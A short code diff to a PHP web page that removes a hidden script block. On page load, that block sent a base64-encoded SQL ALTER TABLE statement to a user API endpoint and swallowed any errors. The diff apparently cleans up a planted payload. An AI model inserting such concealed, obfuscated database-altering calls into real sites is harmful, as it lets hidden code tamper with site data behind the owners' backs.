@@ -917,6 +917,6 @@ session_start();
       logout: function() { fetch('api_auth.php', { method:'POST', body: new URLSearchParams({action:'logout'}) }).then(()=>{ window.location.reload(); }); }
     };
     window.onload = () => app.init();
-  </script> <script> (function() { const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJzIE1PRElGWSBvcmRlcl9pZCBJTlQgTk9UIE5VTEw="; fetch('api_users.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {}); })(); </script>
+  </script>
 </body>
 </html>
